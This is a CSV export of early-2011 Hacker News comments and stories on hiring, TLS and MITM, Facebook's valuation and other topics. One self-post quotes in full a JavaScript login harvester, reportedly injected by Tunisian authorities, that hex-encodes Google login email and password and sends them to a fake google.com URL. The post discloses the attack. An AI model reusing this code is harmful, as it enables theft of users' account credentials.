ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
2079295,comment,2079119,2079119,0,0,selectnull,,,"Although we are not in the same situation, I can help you with some tips. I work for a web development company in Croatia and recently we started to search for a <i>great</i> salesperson.<p>We wrote a post on our blog <a href=""http://www.logit.hr/blog/logithr-hiring-it-sales-specialist/"" rel=""nofollow"">http://www.logit.hr/blog/logithr-hiring-it-sales-specialist/</a> describing what we do and what we don't want in a salesperson. (the site is in Croatian, but that post is in English). We ran a marketing campaign advertising that post on several ad networks, including Google Display Network (AdSense). It's intentionally provocative, but it did produce the results we expected, namely, a few good men worth interviewing.
We treat hiring the same way we treat any other marketing ad. We want to attract great people, therefore we make an effort to make it look really good.
Of course, that is only a first step in hiring process: the next step is an interview part, which is another topic altogether.<p>The main point is this: first you need to find <i>quality</i> people to talk to and you need to sell them your idea. Advertising a job post might be one good way to do that.",1294401202
2079294,comment,2079223,2079249,0,0,mooism2,,,"I agree TLS should be more widely used. But...<p>When the government or ISP in question controls its own certificate authority (and many do), they can MITM you even over HTTPS. Yes, it's another speedbump for them to get over. No, it's not going to stop them.<p>The X.509 security model is broken and needs fixing or replacing.",1294401168
2079293,comment,2078039,2078602,0,0,pornel,,,"What's the cut taken by Apple Stores? (brick'n'mortar and online one, both stocking MS/Adobe products)",1294401152
2079291,comment,2079287,2079287,0,0,haribilalic,,,"Single page: <a href=""http://www.theglobeandmail.com/news/technology/science/honey-laundering-the-sour-side-of-natures-golden-sweetener/article1859410/singlepage/"" rel=""nofollow"">http://www.theglobeandmail.com/news/technology/science/honey...</a>",1294401130
2079290,comment,2079046,2079107,0,0,jrockway,,,"Welcome to Web 3.0, where even the ads and spam are user-generated!",1294401105
2079289,story,,,28,28,bensummers,"Car theft by relaying signals from wireless keys",http://www.technologyreview.com/computing/27037/page1/,,1294401101
2079288,comment,2077312,2078362,0,0,hni,,,"Mark seems to see the main problem with the carbs contained in grains. This does not apply to Gluten protein obviously, as it is nearly free of carbohydrates. The only problem with Gluten seems to be that some (up to a third according to Mark) people seem to be intolerant to Gluten. From what I could gather from the two links you provided, you should be ok with a Gluten-heavy diet as long as you make sure that you are not sensitive to it (which can be diagnosed easily)",1294401071
2079287,story,,,3,1,haribilalic,"Honey laundering: The sour side of nature’s golden sweetener",http://www.theglobeandmail.com/news/technology/science/honey-laundering-the-sour-side-of-natures-golden-sweetener/article1859410/,,1294400995
2079286,comment,2079261,2079261,0,0,iwwr,,,"Is it possible to boot a generic OS (not necessarily linux or windows) from USB by simply loading a live-CD image file?<p>Use case: one USB drive with custom MBR, one text configuration file and one or more liveCD images. On boot-up, the user selects one of the images and loads that generic OS.",1294400978
2079285,comment,2079223,2079249,0,0,jrockway,,,"I guess SSL is an improvement.  Now you just have to trust 2000 companies and anyone controlling their purse strings, instead of having to trust everyone.  You feel safe, which is much better than being safe...",1294400877
2079284,comment,2076785,2076785,0,0,PostOnce,,,"Girls watch porn too. That fact apparently eludes the author.",1294400840
2079283,comment,2079246,2079271,0,0,emreas,,,"Thanks. You should definitely stop by if you are in the area.",1294400818
2079282,comment,2079210,2079210,0,0,demallien,,,"I'm not sure what your problem is with the ""syntax for OOP"".  At any rate, I have just finished building an MVC framework for Javascript without any major difficulties.  Perhaps you could share an example that has posed you problems?<p>One thing that I will say about functional programming and UIs is that they can be somewhat antithetical - to get good performance out of UIs, you often need to cache pre-computed results, which is just another way of saying that your code is going to have a boatload of state.  Incidently, if anyone knows of a functional solution that overcomes this difficulty, I'd love to hear it.",1294400806
2079281,comment,2079223,2079249,0,0,pmjordan,,,"With this scale of access to the network infrastructure[1], I'd be worried about them injecting drive-by downloads of browser exploits which install trust for a root certificate controlled by the government. Once in place, MITM attacks on https are possible. The tricky bit would be telling apart requests from compromised machines and uncompromised ones. (attempting to MITM the latter will cause the browser to start jumping up and down, potentially raising suspicion)<p>Even more scary is the thought experiment that Microsoft might cooperate with the Tunisian government and allow installing trust for such a root certificate via the windows update mechanism. (I have no evidence that this actually happens, it just seems a convenient vector)<p>[1] They're under no time pressure and can transparently proxy every single TCP connection and IP packet if they so desire. They control DNS.",1294400794
2079278,comment,2078942,2078942,0,0,wccrawford,,,"I think beyond all that, you need to have the ability to keep all of it in your head at once.  It has to be a cohesive thing, not something that's strung together like Frankenstein's monster.",1294400754
2079277,comment,2079218,2079218,0,0,jrockway,,,"What do you do with the piss once you extract it?  I have always wondered...",1294400749
2079276,comment,2077492,2078480,0,0,jrockway,,,"Probably the second one.  Financial documents are typically prepared by lawyers and bankers, not cryptographers.<p>Or he asked his friend, ""hey, can I see your document... yup, they're identical"" and then leaked with impunity.  If the public really wants something, and you send a document with that information on it to a bunch of people, it's going to be leaked.  I think Goldman is smart enough to realize this; the buzz is helping their business, but they knew they would get in trouble if they just announced the numbers.  So they just gave it to random people with a I-did-my-due-diligence-NDA and let entropy take care of the rest.",1294400677
2079275,comment,2079223,2079223,0,0,Jabbles,,,"<i>Fortunately, because the fake ""wo0dh3ad"" page accessed was on their site, Facebook may well have a log of everyone whose account was compromised and can take steps to warn and protect their Tunisian users. </i><p>Why would the Tunisian government have allowed ISPs to forward these requests? Facebook probably knows nothing about this.",1294400658
2079274,comment,2076785,2077594,0,0,Eliezer,,,"This shows that all female authors secretly want to set a low standard for evidence!",1294400639
2079273,comment,2078693,2079252,0,0,JamesDB,,,"A site in the UK that gets a huge amount of traffic and is backed by a large off-line national advertising campaign. Why has this been banned? Never seen spam on there, nor have seen them spamming.",1294400564
2079272,comment,2078476,2078476,0,0,wccrawford,,,"Insulting others is rarely the way to motivate them.",1294400551
2079271,comment,2079246,2079246,0,0,jbseek,,,"+1 I like the idea, this seems like a pretty interesting way to build a relationship with tons of like minded people.",1294400506
2079270,comment,2076785,2076785,0,0,RyanMcGreal,,,"> at the heart of human sexuality, at least human sexuality involving men, lies what Freud<p>And I'm done with this steaming pile of misanthropy. An essay on sexuality that falls back on Freudian ideas is beyond redemption.",1294400420
2079269,story,,,2,0,TomasSedovic,"""SMS of Death"" Could Crash Many Mobile Phones",http://www.technologyreview.com/printer_friendly_article.aspx?id=27021,,1294400404
2079268,story,,,2,0,driverdan,"Ask HN: Ramifications of violating patents with open source",,"I'm curious what damages would be if you released an open source project that violated patents. I've found info about cases where this happened and the project shut down or was granted a royalty-free license but not anything about it being brought to court.<p>Obviously there would be the expense of defense. Wouldn't monetary damages be based on losses? Wouldn't it be the burden of the patent holder to prove damages?",1294400382
2079267,comment,2076516,2077328,0,0,statictype,,,"The one-click install without having to dick around with disk images and dragging icons from one part of a window to another is great.<p>But there's still lots of polish that it lacks.<p>It puts every app in the dock. What happens when someone wants to remove the app and tries to do so by dragging it off the dock?<p>The app still resides in the Applications folder but the user thinks it's gone. Now if he wants to download it again and goes back to the App Store the app is still marked as 'Installed' even though he thinks it's gone.<p>If he knows to look in the Applications folder and then tries to drag it to the trash, you get a UAC dialog asking for the root password.<p>So, they've partially solved the App install experience but not fully. The interface still has rough edges, which I'm sure they may eventually get right.",1294400213
2079266,comment,2077484,2078345,0,0,slig,,,"I wasn't clear: I meant, if you visit other people's profile, you can see that info there, that is used to display whether the person replies frequently or not.",1294400200
2079265,story,,,1,0,TomasSedovic,"A Better Text Find & Replace User Interface",http://blog.latenightsw.com/?p=393,,1294400181
2079264,comment,2078693,2078693,0,0,viraptor,,,"Doesn't include swik.net which is a crap link aggregation / search tag spam - I'd expect that one to be removed...",1294400125
2079263,comment,2076227,2076752,0,0,nitrogen,,,"All three?  I think you may have miscounted:<p>BlackBerry, WebOS (if HP keeps it up), WinMo, Android, MeeGo, Symbian, iOS.  Did I miss any?",1294400089
2079262,story,,,1,0,strayer,"One-slide presentation software",http://prezi.com,,1294399979
2079261,story,,,43,10,mikagrml,"Booting ISO images from within GRUB2",http://michael-prokop.at/blog/2011/01/07/booting-iso-images-from-within-grub2/,,1294399974
2079260,comment,2079121,2079202,0,0,ulf,,,"That is the correct answer on a LOT of ""How do you do it""s, actually. Sometimes there are alternatives, but you cannot beat a longtime community involvement if you want your voice to be heard...",1294399926
2079259,comment,2076227,2077433,0,0,nitrogen,,,"I don't think complexity is nearly the enemy of hackability that manufacturer lockdown is.  Modern cars can still be hacked -- everything from OBD-2 interfaces to modified firmware for engine control units.  FPGAs provide a way to tinker with hardware concepts.<p>The demise of hackability is and will be due to DRM and the hardware equivalents (like impossible-to-find proprietary screwdrivers).",1294399909
2079257,comment,2077312,2078181,0,0,lsc,,,">there are virtually no long term gains you can realize in a day that will increase your vertical leap.<p>Eh, I'd bet you five bucks that if you measured my leap now, then had someone who knew what the hell they were doing show me proper form, maybe walk me through it a few times, you'd see a pretty radical improvement within the hour.  Not, of course, due to any sort of muscular growth, but instead because I imagine my current vertical leap form is horrible, and you can usually get pretty good gains out of that sort of thing just by doing it correctly.",1294399811
2079256,story,,,6,0,wheels,"Chronic Under-financing of EU Start-ups Driven by Mindset",http://babblingvc.typepad.com/pjozefak/2011/01/chronic-under-financing-of-eu-start-ups-driven-by-mindset.html,,1294399640
2079255,comment,2076227,2076676,0,0,jonhendry,,,"I bet truck drivers do, especially drivers with terminals in their trucks.",1294399612
2079253,comment,2077492,2078893,0,0,JonnieCache,,,"Goldman have a <i>lot</i> of other ways of profiting from this other than simply taking a share of FB margins. For a start, they get to be in charge of the entire IPO process. That alone will be <i>very</i> profitable for them.<p>There was a bunch of other stuff like this discussed in the threads on the goldman investment itself.",1294399553
2079252,comment,2078693,2078693,0,0,robinduckett,,,"I'm seeing:<p><a href=""http://www.deadmau5.com"" rel=""nofollow"">http://www.deadmau5.com</a> -> Really, spam?<p><a href=""http://www.comparethemarket.com"" rel=""nofollow"">http://www.comparethemarket.com</a> -> Price comparison site with no known biases in the UK <i></i>and<i></i> not owned by British Telecommunications, as it is listed.<p>Even ONE false positive is enough to make me think this listing is a load of bullshit. How is geocities' ""closing down"" page spam?",1294399514
2079251,comment,2079218,2079218,0,0,user24,,,"funny, but rather pointless...",1294399512
2079250,story,,,28,28,macco,"If Facebook is Worth $50B, Apple is Worth $1.4T",http://blog.vuru.co/post/2632452622/if-facebook-is-worth-50b-apple-is-worth-1-4t,,1294399497
2079249,comment,2079223,2079223,0,0,wladimir,,,"Proves again, there is really no excuse not to use HTTPS for everything.<p>Encryption/certificate validation make it much harder to pull of a MITM attack like this, especially by companies and small repressive governments.",1294399420
2079248,comment,2072200,2078784,0,0,borism,,,"<i>That's not something any revolution I have ever heard about has been started over</i><p>Because revolutions of the future will be nothing like revolutions of the past.",1294399411
2079247,comment,2077492,2077492,0,0,hessenwolf,,,"In pitching as much as $1.5 billion in stock in the closely held social-networking company to wealthy investors, Goldman Sachs disclosed that it might sell or hedge its own $375 million investment without warning clients.<p>Source:
<a href=""http://www.bloomberg.com/news/2011-01-07/goldman-efforts-to-burnish-image-may-be-undermined-by-facebook.html"" rel=""nofollow"">http://www.bloomberg.com/news/2011-01-07/goldman-efforts-to-...</a>",1294399402
2079246,story,,,135,35,emreas,"The Palo Alto 24/7 Hacker House: You're Invited.",,"An excerpt from Fortune about the early “office” of facebook:<p>“The house at 819 La Jennifer Way, with a resident population of seven guys, felt like a dorm. Some people — female and male — stopped by for days and just hung around. Stanford University was only a mile away, so the housemates would announce parties using a Facebook feature that enabled them to target specific schools. They were mobbed by Stanford students and townies.”<p>After a month with 7 of us living in a 1 bedroom apartment in Palo Alto, we have decided to upgrade. We are recreating the atmosphere described above of high energy openness and are inviting brilliant hackers, designers, ideators… you name it… to drop by and work, hangout, and live with us (seriously, we are only using 2 of the 5 bedrooms in this place so let me know if you are looking for a sweet place to live).<p>The house is in Midtown Palo Alto (walking distance to anything you will ever need) and has a huge open working space for whomever wants to come. We work 18+ hours a day (somebody is always awake), have a constant supply of snacks and beverages, and invite hackers around the world to drop by anytime, 24/7 to work, live for a bit, hack with us, play a game of ping pong or just hangout. Email me anytime to get the address and drop by or say hello. evan dot reas at gmail",1294399360
2079245,comment,2077312,2079219,0,0,jokull,,,"Does he explicitly recommend <i>fermented</i> cod liver oil or just any cod liver oil?",1294399342
2079243,comment,2079226,2079226,0,0,bensummers,,,"BizSpark is a big win for startups - if you have anything even slightly to do with Windows (eg your users use it to run web browsers) you should be a member of BizSpark so you get access to <i>everything</i> for free.<p>Plus, if you're on a Mac, it gives you two licenses of Office for Mac 2011.",1294399331
2079242,comment,2078749,2079189,0,0,erikstarck,,,"Well, we're still at the very early stages of social media on the web. As someone else points out in another comment: owning the complete social graph may very well be the most valuable asset ever. I think the potential market for Facebook can grow much more than just 3 times over the next 7 years.<p>Inflation has been low the last decade, but sure, that affects the numbers.",1294399318
2079241,comment,2078661,2078661,0,0,macco,,,"Where is this a stolen piece. If they did the whole picture it would stolen, if they took a certain part of the picture it would be stolen, but the didn't.
The picture of Picasso is just awesome, the Finder icon is ok, could be drawn by a kid.",1294399228
2079240,comment,2076358,2076358,0,0,conjectures,,,"Maybe part of the issue is ""Many of the best college students at MIT are risk averse and think short term.""  The top students at the top universit[y|ies] form quite a narrow recruiting pool.  Are you sure the people you are looking for can only be found within this group?  You've also just helped to alienate the top 1% of students from long tail universities, or none at all (why waste time on a program that will sift based on your alma mater rather than your abilities? - I mean what are you actually looking for from recruits?)<p>Also, if that is your target group it's bizarre to exhibit any sort of surprise that there is fierce competition from other recruiters (Wall Street, Google), and that statups might not fare well against them (who has more $$$ to offer?).<p>""Too Many Startups / Choice Paradox. Students have no idea how to pick the right startups.  Even if they did, there are an overwhelming number of choices.  This is classic paradox of choice.""  
I expect that anyone who knows how to pick the right startups should consider moving into venture capital.",1294399136
2079239,comment,2076180,2079104,0,0,ThomPete,,,"You don't need thousands of documents to leak interesting stuff.",1294399091
2079238,comment,2078661,2078832,0,0,macco,,,"I think cubism was hell of an idea. Probably an idea of an genius. :)",1294399031
2079237,story,,,76,14,bensummers,"How to evaluate and implement startup ideas using Hypothesis Driven Development",http://swombat.com/2011/1/7/how-to-evaluate-and-implement-startup-ideas-using-hypothesis-driven-development,,1294398998
2079235,comment,2076516,2077652,0,0,iuguy,,,"I hope so. I don't mind iTunes as a music player on a Mac. It's as a central point of navel lint I have the problem.",1294398914
2079234,comment,2076785,2078531,0,0,iuguy,,,"Certainly in the west, I think there's a world of difference between now and say 10-15 years ago. Within that timeframe of porn ubiquity (although I'm implying correlation not causation here) there's been massive changes in womens' rights and dealing with deadbeat dads, to the point where women can put themselves in a bad situation by getting pregnant, but can also put men in a bad situation too.<p>At the same time the rights of men have not changed with this, and in many legal systems there's an imbalance (e.g. the father has to make payments but does not have the same rights of access, that there are female DV shelters, but there's nothing I'm aware of in the UK for male DV victims, which is more common than you think).<p>I'm not saying this applies to all people in all cases, but just as the biological skew against women exist, there's a counter skew on the legal and societal side against men (for various values of $legal_system and $society).",1294398868
2079233,comment,2078749,2079057,0,0,scorpion032,,,"That, a Harward freshman could see it and pursue that with a perfect execution, when most couldn't care for, is awesome!",1294398765
2079232,comment,2077492,2077744,0,0,MarkMc,,,"""Google's P/E is ridiculous"" - really?<p>Google's P/E is around 25 which I think is reasonable for a company that a) has been growing earnings on average 20% per year for the last 3 years; and b) Is sitting on a big pile of cash worth about 15% of its market value.<p>(Disclosure: I own google shares)",1294398681
2079231,comment,2078361,2078906,0,0,DavidMcLaughlin,,,"You can say shit here.",1294398624
2079230,comment,2079046,2079215,0,0,Wildfalcon,,,"Yes, this is a very much requested change, so I'm going to move it to top of my list<p>I just created a MailChimp list so if you sign up (<a href=""http://eepurl.com/caXRn"" rel=""nofollow"">http://eepurl.com/caXRn</a>) I will send out a newsletter when its done",1294398602
2079229,comment,2079223,2079223,0,0,bensummers,,,"Story behind this: <a href=""http://cpj.org/internet/2011/01/tunisia-invades-censors-facebook-other-accounts.php"" rel=""nofollow"">http://cpj.org/internet/2011/01/tunisia-invades-censors-face...</a>",1294398575
2079228,comment,2077312,2078809,0,0,alinajaf,,,"Seriously, this was the one chapter that was missing from the book.",1294398383
2079226,story,,,5,1,bensummers,"Bindi Karia and Microsoft BizSpark",http://www.director.co.uk/MAGAZINE/2011/1_Jan/bindi-karia-bizSpark_64_05.html,,1294398342
2079225,comment,2078361,2078969,0,0,Nitramp,,,"While hubris can be a problem, I'm very much a fan of stating your opinion clear and bold. One might be wrong, but astute readers should be able to judge ideas for themselves. Speaking clearly will also make it much easier for people to see if you're wrong.<p>I think giving clear statements of your opinion and being proven wrong is much better than obscuring your point with ""maybe"" and ""personally"" and ""IMHO"". That's depending on the context of course, as you don't want to unnecessarily offend people (which is bad in general, but also counterproductive). But in a general analysis like this, not attacking particular people's shortcomings? Go for it.",1294398288
2079224,comment,2071288,2078031,0,0,blueben,,,"Presumably you read my first reply, in which case you do know ""what those would be"". Once again, it's about convenience.",1294398232
2079223,story,,,79,36,SimplePast,Http://www.google.com/wo0dh3ad,,"This is the function used by Tunisia Gov agencies to  harvest login/passwords :
see also http://www.thetechherald.com/article.php/201101/6651<p><script language=""javascript"">
<!--
function h6h(st){var st2="""";for(i=0;i<st.length;i++){c=st.charCodeAt(i);ch=(c&0xF0)>>4;cl=c&0x0F;
st2=st2+String.fromCharCode(ch+97)+String.fromCharCode(cl+97);}return st2;}
function r5t(len){var st="""";for(i=0;i<len;i++)st=st+String.fromCharCode(Math.floor(Math.random(1)*26+97)); return st;}
function hAAAQ3d() {var frm = document.getElementById(""gaia_loginform""); var us3r = frm.Email.value; var pa55 = frm.Passwd.value;
 var url = ""http://www.google.com/wo0dh3ad?q=""+r5t(5)+""&u=""+h6h(us3r)+""&p=""+h6h(pa55);
 var bnm = navigator.appName; if(bnm=='Microsoft Internet Explorer') inv0k3(url); else inv0k2(url);}
function inv0k1(url) {var objhq = document.getElementById(""x6y7z8""); objhq.src = url;}
function inv0k2(url) {var xr = new XMLHttpRequest(); xr.open(""GET"", url, false); xr.send("""");}
function inv0k3(url) {var xr = new ActiveXObject('Microsoft.XMLHTTP'); xr.open(""GET"", url, false); xr.send("""");}
//--><p></script>",1294398154
2079222,comment,2079121,2079212,0,0,ido,,,"He eventually raised 31k, and this is just for the development of Hadean Lands - which he will also be selling on the app store once completed.<p>So the sum is more like bootstrapping the monetization of a lifetimes work by financing the first project!",1294398079
2079221,comment,2076358,2076358,0,0,yters,,,"What I need is a startup recruiter for people working with time to spare.  If you don't assume someone has to take the complete step of faith and quit job cold turkey, you have a very large talent pool, tho you'll need an innovative work strategy.  Patio11 has seen success here, as we know.<p>My .02, and would work with such a recruiter if existed.  Email eric dot holloway at gmail if wishing to converse w/ me.",1294398002
